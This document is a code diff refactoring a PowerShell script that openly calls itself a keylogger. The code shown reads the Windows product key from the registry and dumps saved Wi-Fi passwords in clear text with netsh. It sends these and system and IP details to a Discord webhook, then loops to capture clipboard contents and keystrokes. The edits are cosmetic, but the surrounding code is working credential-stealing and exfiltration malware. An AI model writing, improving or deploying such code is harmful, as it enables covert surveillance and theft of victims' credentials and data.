@@ -48,14 +48,13 @@ function Get-SystemInfo {
         "CPU" = (Get-WmiObject -Class Win32_Processor).Name
         "RAM" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
     }
-    $sysinfo
+    return $sysinfo
 }
 
 # Function to get Windows activation key (requires administrative privileges)
 function Get-WindowsKey {
-    $keyPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-    $key = Get-ItemProperty -Path $keyPath -Name DigitalProductId
-    $key = $key.DigitalProductId
+    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    $key = (Get-ItemProperty -Path $path -Name DigitalProductId).DigitalProductId
     $key = [System.Text.Encoding]::Unicode.GetString($key, 52, 16)
     return $key
 }
@@ -80,12 +79,12 @@ function Get-PublicIP {
 # Function to get Wi-Fi information
 function Get-WifiInfo {
     try {
-        $wifiInfo = netsh wlan show profile | Select-String "All User Profile" | ForEach-Object {
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
             $_ -replace '^\s+All User Profile\s*:\s*', ''
         }
 
-        $wifiPasswords = @()
-        foreach ($profile in $wifiInfo) {
+        $wifiInfo = @()
+        foreach ($profile in $profiles) {
             $profileName = $profile.Trim()
             $details = netsh wlan show profile "$profileName" key=clear
             if ($details -match "Key Content\s*:\s*(.+)") {
@@ -93,10 +92,10 @@ function Get-WifiInfo {
             } else {
                 $password = "No password found"
             }
-            $wifiPasswords += "$profileName: $password"
+            $wifiInfo += "$profileName: $password"
         }
 
-        return $wifiPasswords -join "`n"
+        return $wifiInfo -join "`n"
     } catch {
         return "Unable to retrieve Wi-Fi information"
     }
@@ -116,14 +115,13 @@ function Send-DiscordMessage {
     Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $payload
 }
 
-# Get system information
+# Main code block to send initial message
 $systemInfo = Get-SystemInfo
 $publicIP = Get-PublicIP
 $internalIP = Get-InternalIP
 $windowsKey = Get-WindowsKey
 $wifiInfo = Get-WifiInfo
 
-# Send initial message to Discord
 $initialMessage = @"
 **Key Logger Started.**
 
@@ -149,7 +147,7 @@ $wifiInfo
 
 Send-DiscordMessage -WebhookUrl $dc -Message $initialMessage
 
-# Main loop
+# Main loop for capturing keystrokes and other activities
 While ($true) {
     $keyPressed = $false
     $clipboardContent = Get-ClipboardContent
